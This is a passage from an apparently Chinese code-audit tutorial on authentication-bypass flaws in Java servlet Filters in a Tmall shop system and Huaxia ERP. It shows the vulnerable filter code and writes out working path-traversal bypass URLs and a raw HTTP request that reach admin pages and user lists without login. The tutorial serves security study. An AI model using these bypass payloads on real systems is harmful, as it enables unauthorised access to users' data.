+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span><span class="w"> </span><span class="n">Mozilla</span><span class="o">/</span><span class="n">5</span><span class="p">.</span><span class="na">0</span><span class="w"> </span><span class="p">(</span><span class="n">Windows</span><span class="w"> </span><span class="n">NT</span><span class="w"> </span><span class="n">10</span><span class="p">.</span><span class="na">0</span><span class="p">;</span><span class="w"> </span><span class="n">Win64</span><span class="p">;</span><span class="w"> </span><span class="n">x64</span><span class="p">;</span><span class="w"> </span><span class="n">rv</span><span class="p">:</span><span class="n">138</span><span class="p">.</span><span class="na">0</span><span class="p">)</span><span class="w"> </span><span class="n">Gecko</span><span class="o">/</span><span class="n">20100101</span><span class="w"> </span><span class="n">Firefox</span><span class="o">/</span><span class="n">138</span><span class="p">.</span><span class="na">0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Accept</span><span class="p">:</span><span class="w"> </span><span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xhtml</span><span class="o">+</span><span class="n">xml</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xml</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">9</span><span class="p">,</span><span class="o">*/*</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">8</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="p">:</span><span class="w"> </span><span class="n">zh</span><span class="o">-</span><span class="n">CN</span><span class="p">,</span><span class="n">zh</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">8</span><span class="p">,</span><span class="n">zh</span><span class="o">-</span><span class="n">TW</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">7</span><span class="p">,</span><span class="n">zh</span><span class="o">-</span><span class="n">HK</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">5</span><span class="p">,</span><span class="n">en</span><span class="o">-</span><span class="n">US</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">3</span><span class="p">,</span><span class="n">en</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">2</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span><span class="w"> </span><span class="n">gzip</span><span class="p">,</span><span class="w"> </span><span class="n">deflate</span><span class="p">,</span><span class="w"> </span><span class="n">br</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Connection</span><span class="p">:</span><span class="w"> </span><span class="n">close</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Cookie</span><span class="p">:</span><span class="w"> </span><span class="n">JSESSIONID</span><span class="o">=</span><span class="n">CD52CD7428A42875A7C0E65F6184357A</span><span class="p">;</span><span class="w"> </span><span class="n">Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba</span><span class="o">=</span><span class="n">1748439476</span><span class="p">;</span><span class="w"> </span><span class="n">Hm_lpvt_1cd9bcbaae133f03a6eb19da6579aaba</span><span class="o">=</span><span class="n">1748439476</span><span class="p">;</span><span class="w"> </span><span class="n">HMACCOUNT</span><span class="o">=</span><span class="n">8F61B5143A53B06F</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Upgrade</span><span class="o">-</span><span class="n">Insecure</span><span class="o">-</span><span class="n">Requests</span><span class="p">:</span><span class="w"> </span><span class="n">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Priority</span><span class="p">:</span><span class="w"> </span><span class="n">u</span><span class="o">=</span><span class="n">0</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>正常访问retail_back_list.html直接按照过滤器逻辑跳转到302登录页面</strong></p>
+<p><img src="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/5.png"
+	width="2282"
+	height="814"
+	srcset="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/5_hu_c954220e0cda299.png 480w, /p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/5_hu_5d89bceb136edff6.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="280"
+		data-flex-basis="672px"
+	
+></p>
+<p><strong>但是刚刚可以看到过滤器存在绕过方式，就是当访问文件后缀为.css/.js/.jpg/.png/.gif/.ico开头时，过滤器会不进行校验，所以可以构造路径进行绕过</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nl">http</span><span class="p">:</span><span class="c1">//192.168.165.252:8080/a.css/../pages/materials/retail_back_list.html</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//这个匹配规则是只要匹配到了后缀名关键字则直接绕过</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">http</span><span class="p">:</span><span class="c1">//192.168.165.252:8080/a.jpggg/../pages/materials/retail_back_list.html</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/6.png"
+	width="2497"
+	height="856"
+	srcset="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/6_hu_12ba31f1b0f936e1.png 480w, /p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/6_hu_3aff1d07f9c45150.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="291"
+		data-flex-basis="700px"
+	
+></p>
+<h3 id="32tmall商城系统鉴权漏洞">3.2.Tmall商城系统鉴权漏洞
+</h3><p><strong>pom文件没有Shiro/Spring Security/JWT等依赖，那么网站鉴权应该就可能是过滤器进行验证</strong></p>
+<p><strong>从filter代码中也得到了验证，管理员权限使用Filter代码进行校验</strong></p>
+<p><img src="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/7.png"
+	width="2332"
+	height="1145"
+	srcset="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/7_hu_75ab4dbc90f480fc.png 480w, /p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/7_hu_2a3a0b8fd70fc7d.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="203"
+		data-flex-basis="488px"
+	
+></p>
+<p><strong>看核心doFilter中的代码</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">@Override</span>
+</span></span><span class="line"><span class="cl"><span class="err">public</span> <span class="err">void</span> <span class="err">doFilter(ServletRequest</span> <span class="err">request,</span> <span class="err">ServletResponse</span> <span class="err">response,</span> <span class="err">FilterChain</span> <span class="err">chain)</span> <span class="err">throws</span> <span class="err">IOException,</span> <span class="err">ServletException</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="err">HttpServletRequest</span> <span class="err">servletRequest</span> <span class="err">=</span> <span class="err">(HttpServletRequest)</span> <span class="err">request;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//如果是(登录界面,登录态失效界面)，直接放行
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="err">if(servletRequest.getRequestURI().contains(</span><span class="nt">&#34;/admin/login&#34;</span><span class="err">)</span> <span class="err">||</span>
+</span></span><span class="line"><span class="cl">            <span class="err">servletRequest.getRequestURI().contains(</span><span class="s2">&#34;/admin/account&#34;</span><span class="err">)</span>
+</span></span><span class="line"><span class="cl">    <span class="err">)</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="err">chain.doFilter(request,</span> <span class="err">response);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="err">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="err">logger.info(</span><span class="nt">&#34;检查管理员权限&#34;</span><span class="err">);</span>
+</span></span><span class="line"><span class="cl">        <span class="err">Object</span> <span class="err">o</span> <span class="err">=</span> <span class="err">servletRequest.getSession().getAttribute(</span><span class="s2">&#34;adminId&#34;</span><span class="err">);</span>
+</span></span><span class="line"><span class="cl">        <span class="err">if(o</span> <span class="err">==</span> <span class="kc">null</span><span class="err">)</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="err">logger.info(</span><span class="nt">&#34;无管理权限，返回管理员登陆页&#34;</span><span class="err">);</span>
+</span></span><span class="line"><span class="cl">            <span class="err">request.getRequestDispatcher(</span><span class="s2">&#34;/admin/login&#34;</span><span class="err">).forward(request</span><span class="p">,</span> <span class="err">response);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="err">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="err">logger.info(</span><span class="nt">&#34;权限验证成功，管理员ID：{}&#34;</span><span class="p">,</span><span class="err">o);</span>
+</span></span><span class="line"><span class="cl">            <span class="err">chain.doFilter(request,</span> <span class="err">response);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>doFilter方法：</strong></p>
+<p>**这是过滤器的核心方法，处理每个请求： **</p>
+<ul>
+<li>首先将 <code>ServletRequest</code> 转换为 <code>HttpServletRequest</code>，以便访问 HTTP 特定的功能。</li>
+<li>检查请求的 URI：
+<ul>
+<li>如果请求的是 <code>/admin/login</code>（登录界面）或 <code>/admin/account</code>（登录态失效界面），直接放行（调用 <code>chain.doFilter</code>），允许访问。</li>
+</ul>
+</li>
+<li>对于其他 <code>/admin/</code> 下的请求：
+<ul>
+<li>记录日志 &ldquo;检查管理员权限&rdquo;。</li>
+<li>从 session 中获取 <code>adminId</code> 属性（这是存储管理员 ID 的地方）。</li>
+<li>如果 <code>adminId</code> 为 null：
+<ul>
+<li>记录日志 &ldquo;无管理权限，返回管理员登陆页&rdquo;。</li>
+<li>将请求转发到 <code>/admin/login</code> 页面，要求用户登录。</li>
+</ul>
+</li>
+<li>如果 <code>adminId</code> 不为 null：
+<ul>
+<li>记录日志 &ldquo;权限验证成功，管理员ID：{}&quot;，并打印管理员 ID。</li>
+<li>调用 <code>chain.doFilter</code>，允许请求继续处理。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p><strong>从这个doFilter的代码逻辑上看好像不存在问题，但是这个验证使用的是</strong><code>contains</code><strong>方法，那么Java中的contains方法存在什么问题呢</strong></p>
+<p><strong>contains是一个简单的子字符串匹配方法，但它有以下潜在问题：</strong></p>
+<ul>
+<li><strong><font style="color:#DF2A3F;">路径匹配过于宽松，可能误放行</font></strong></li>
+<li><strong><font style="color:#DF2A3F;">无法精确匹配路径</font></strong></li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">http:</span><span class="c1">//192.168.0.105:8080/tmall/admin/user/1  //这个是后台获取用户信息路由
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="err">由于使用contains进行路径验证</span>
+</span></span><span class="line"><span class="cl"><span class="err">http:</span><span class="c1">//192.168.0.105:8080/tmall/admin/login/../user/1  未授权获取用户信息
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/8.png"
+	width="1930"
+	height="809"
+	srcset="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/8_hu_179c9b775a1ae5bd.png 480w, /p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/8_hu_fbe9fc8d5803272b.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="238"
+		data-flex-basis="572px"
+	
+></p>
+<p><img src="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/9.png"
+	width="1510"
+	height="501"
+	srcset="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/9_hu_2f0b5dd066800fad.png 480w, /p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/9_hu_d55916b38f0aa77d.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="301"
+		data-flex-basis="723px"
+	
+></p>
+<h3 id="33华夏erp系统鉴权漏洞">3.3.华夏ERP系统鉴权漏洞
+</h3><p><a class="link" href="https://mp.weixin.qq.com/s?__biz=MzkwNTQxNDc1MQ==&amp;mid=2247485207&amp;idx=1&amp;sn=317cd9288fe62b72df845ee548a773f7&amp;chksm=c1cba804b2c7fdcd35c051ef6e889c5861dd73629e68deb22cf1a7c713b05f647414fc3b31c9#rd"  target="_blank" rel="noopener"
+    >https://mp.weixin.qq.com/s?__biz=MzkwNTQxNDc1MQ==&amp;mid=2247485207&amp;idx=1&amp;sn=317cd9288fe62b72df845ee548a773f7&amp;chksm=c1cba804b2c7fdcd35c051ef6e889c5861dd73629e68deb22cf1a7c713b05f647414fc3b31c9#rd</a></p>
+<p><strong>查看pom.xml依赖文件，不存在shiro框架，Spring Security框架，没有使用JWT，应该就只能使用Filter进行权限校验</strong></p>
+<p><strong>查看过滤器中的doFilter方法</strong></p>
+<p><img src="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/10.png"
+	width="2463"
+	height="1165"
+	srcset="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/10_hu_3c87b841740fd3be.png 480w, /p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/10_hu_c35a566487cc343c.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="211"
+		data-flex-basis="507px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">public</span> <span class="err">void</span> <span class="err">doFilter(ServletRequest</span> <span class="err">request,</span> <span class="err">ServletResponse</span> <span class="err">response,</span>
+</span></span><span class="line"><span class="cl">                         <span class="err">FilterChain</span> <span class="err">chain)</span> <span class="err">throws</span> <span class="err">IOException,</span> <span class="err">ServletException</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="err">HttpServletRequest</span> <span class="err">servletRequest</span> <span class="err">=</span> <span class="err">(HttpServletRequest)</span> <span class="err">request;</span>
+</span></span><span class="line"><span class="cl">        <span class="err">HttpServletResponse</span> <span class="err">servletResponse</span> <span class="err">=</span> <span class="err">(HttpServletResponse)</span> <span class="err">response;</span>
+</span></span><span class="line"><span class="cl">        <span class="err">String</span> <span class="err">requestUrl</span> <span class="err">=</span> <span class="err">servletRequest.getRequestURI();</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">//具体，比如：处理若用户未登录，则跳转到登录页
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="err">Object</span> <span class="err">userInfo</span> <span class="err">=</span> <span class="err">servletRequest.getSession().getAttribute(</span><span class="nt">&#34;user&#34;</span><span class="err">);</span>
+</span></span><span class="line"><span class="cl">        <span class="err">if(userInfo!=</span><span class="kc">null</span><span class="err">)</span> <span class="p">{</span> <span class="c1">//如果已登录，不阻止
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="err">chain.doFilter(request,</span> <span class="err">response);</span>
+</span></span><span class="line"><span class="cl">            <span class="err">return;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="err">if</span> <span class="err">(requestUrl</span> <span class="err">!=</span> <span class="kc">null</span> <span class="err">&amp;&amp;</span> <span class="err">(requestUrl.contains(</span><span class="s2">&#34;/login.html&#34;</span><span class="err">)</span> <span class="err">||</span> <span class="err">requestUrl.contains(</span><span class="s2">&#34;/register.html&#34;</span><span class="err">)))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="err">chain.doFilter(request,</span> <span class="err">response);</span>
+</span></span><span class="line"><span class="cl">            <span class="err">return;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="err">if</span> <span class="err">(verify(ignoredList</span><span class="p">,</span> <span class="err">requestUrl))</span> <span class="err">{</span>
+</span></span><span class="line"><span class="cl">            <span class="err">chain.doFilter(servletRequest,</span> <span class="err">response);</span>
+</span></span><span class="line"><span class="cl">            <span class="err">return;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="err">if</span> <span class="err">(</span><span class="kc">null</span> <span class="err">!=</span> <span class="err">allowUrls</span> <span class="err">&amp;&amp;</span> <span class="err">allowUrls.length</span> <span class="err">&gt;</span> <span class="mi">0</span><span class="err">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="err">for</span> <span class="err">(String</span> <span class="err">url</span> <span class="err">:</span> <span class="err">allowUrls)</span> <span class="err">{</span>
+</span></span><span class="line"><span class="cl">                <span class="err">if</span> <span class="err">(requestUrl.startsWith(url))</span> <span class="err">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="err">chain.doFilter(request,</span> <span class="err">response);</span>
+</span></span><span class="line"><span class="cl">                    <span class="err">return;</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="err">}</span>
+</span></span><span class="line"><span class="cl">        <span class="err">}</span>
+</span></span><span class="line"><span class="cl">        <span class="err">servletResponse.sendRedirect(</span><span class="s2">&#34;/login.html&#34;</span><span class="err">);</span>
+</span></span><span class="line"><span class="cl">    <span class="err">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>Filter鉴权代码核心逻辑</strong></p>
+<ul>
+<li><strong>登录状态检查</strong></li>
+<li><strong>若用户已登录（</strong><code>session</code> 中存在 <strong><code>user</code></strong> 属性），则直接放行请求12。</li>
+<li>**若用户未登录，则进一步判断请求的 URL 是否属于以下允许范围： **
+<ul>
+<li><strong>登录/注册页面</strong>：<strong><code>/login.html</code></strong> 或 <code>/register.html</code><strong>，允许访问以进行身份认证</strong>5。</li>
+<li><strong>静态资源</strong>：通过 <code>ignoredUrl</code> 参数配置（如 <code>.css</code>, <code>.js</code>, 图片等），避免对静态文件进行权限拦截5。</li>
+<li><strong>特定允许路径</strong>：通过 <strong><code>filterPath</code></strong> 参数配置（如 <strong><code>/user/login</code></strong>, <code>/user/registerUser</code>），可能用于开放某些接口或页面的访问权限5。</li>
+</ul>
+</li>
+<li><strong>未授权请求处理</strong></li>
+<li><strong>若请求不满足上述条件，则重定向至 <strong><code>/login.html</code></strong>，强制用户登录5。</strong></li>
+</ul>
+<p><strong>华夏ERP的鉴权和Tmall商城系统鉴权一样，都是采用Filter进行鉴权，并且都使用了存在问题的函数</strong><code>contains</code></p>
+<h4 id=""><strong><font style="color:#DF2A3F;">第一处：如果请求url中包含/login.html或者register.html，那么就直接放行</font></strong>
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">GET</span> <span class="err">/login.html/../user/getUserList?search=%</span><span class="mi">7</span><span class="err">B%</span><span class="mi">22</span><span class="err">userName%</span><span class="mi">22</span><span class="err">%</span><span class="mi">3</span><span class="err">A%</span><span class="mi">22</span><span class="err">%</span><span class="mi">22</span><span class="err">%</span><span class="mi">2</span><span class="err">C%</span><span class="mi">22</span><span class="err">loginName%</span><span class="mi">22</span><span class="err">%</span><span class="mi">3</span><span class="err">A%</span><span class="mi">22</span><span class="err">%</span><span class="mi">22</span><span class="err">%</span><span class="mi">7</span><span class="err">D&amp;currentPage=</span><span class="mi">1</span><span class="err">&amp;pageSize=</span><span class="mi">15</span> <span class="err">HTTP/</span><span class="mf">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="err">Host:</span> <span class="mf">192.168</span><span class="err">.</span><span class="mf">165.252</span><span class="err">:</span><span class="mi">8082</span>
+</span></span><span class="line"><span class="cl"><span class="err">User-Agent:</span> <span class="err">Mozilla/</span><span class="mf">5.0</span> <span class="err">(Windows</span> <span class="err">NT</span> <span class="mf">10.0</span><span class="err">;</span> <span class="err">Win</span><span class="mi">64</span><span class="err">;</span> <span class="err">x</span><span class="mi">64</span><span class="err">;</span> <span class="err">rv:</span><span class="mf">139.0</span><span class="err">)</span> <span class="err">Gecko/</span><span class="mi">20100101</span> <span class="err">Firefox/</span><span class="mf">139.0</span>
+</span></span><span class="line"><span class="cl"><span class="err">Accept:</span> <span class="err">application/json,</span> <span class="err">text/javascript,</span> <span class="err">*/*;</span> <span class="err">q=</span><span class="mf">0.01</span>
+</span></span><span class="line"><span class="cl"><span class="err">Accept-Language:</span> <span class="err">zh-CN,zh;q=</span><span class="mf">0.8</span><span class="err">,zh-TW;q=</span><span class="mf">0.7</span><span class="err">,zh-HK;q=</span><span class="mf">0.5</span><span class="err">,en-US;q=</span><span class="mf">0.3</span><span class="err">,en;q=</span><span class="mf">0.2</span>
+</span></span><span class="line"><span class="cl"><span class="err">Accept-Encoding:</span> <span class="err">gzip,</span> <span class="err">deflate,</span> <span class="err">br</span>
+</span></span><span class="line"><span class="cl"><span class="err">X-Requested-With:</span> <span class="err">XMLHttpRequest</span>
+</span></span><span class="line"><span class="cl"><span class="err">Connection:</span> <span class="err">close</span>
+</span></span><span class="line"><span class="cl"><span class="err">Referer:</span> <span class="err">http:</span><span class="c1">//192.168.165.252:8082/pages/manage/user.html
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/11.png"
+	width="2493"
+	height="813"
+	srcset="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/11_hu_885008342ecda7b1.png 480w, /p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/11_hu_80977a4f6bf5e7d2.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="306"
+		data-flex-basis="735px"
+	
+></p>
+<p><strong>除了这个contains代码片段存在问题，Filter类上的注解也存在安全问题</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">@WebFilter(filterName</span> <span class="err">=</span> <span class="s2">&#34;LogCostFilter&#34;</span><span class="err">,</span> <span class="err">urlPatterns</span> <span class="err">=</span> <span class="p">{</span><span class="nt">&#34;/*&#34;</span><span class="p">}</span><span class="err">,</span>
+</span></span><span class="line"><span class="cl">        <span class="err">initParams</span> <span class="err">=</span> <span class="p">{</span><span class="err">@WebInitParam(name</span> <span class="err">=</span> <span class="nt">&#34;ignoredUrl&#34;</span><span class="p">,</span> <span class="err">value</span> <span class="err">=</span> <span class="nt">&#34;.css#.js#.jpg#.png#.gif#.ico&#34;</span><span class="err">)</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                      <span class="err">@WebInitParam(name</span> <span class="err">=</span> <span class="nt">&#34;filterPath&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                              <span class="err">value</span> <span class="err">=</span> <span class="nt">&#34;/user/login#/user/registerUser&#34;</span><span class="err">)</span><span class="p">}</span><span class="err">)</span>
+</span></span><span class="line"><span class="cl"><span class="err">public</span> <span class="err">class</span> <span class="err">LogCostFilter</span> <span class="err">implements</span> <span class="err">Filter</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="err">private</span> <span class="err">static</span> <span class="err">final</span> <span class="err">String</span> <span class="err">FILTER_PATH</span> <span class="err">=</span> <span class="nt">&#34;filterPath&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">    <span class="err">private</span> <span class="err">static</span> <span class="err">final</span> <span class="err">String</span> <span class="err">IGNORED_PATH</span> <span class="err">=</span> <span class="s2">&#34;ignoredUrl&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="err">private</span> <span class="err">static</span> <span class="err">final</span> <span class="err">List&lt;String&gt;</span> <span class="err">ignoredList</span> <span class="err">=</span> <span class="err">new</span> <span class="err">ArrayList&lt;&gt;();</span>
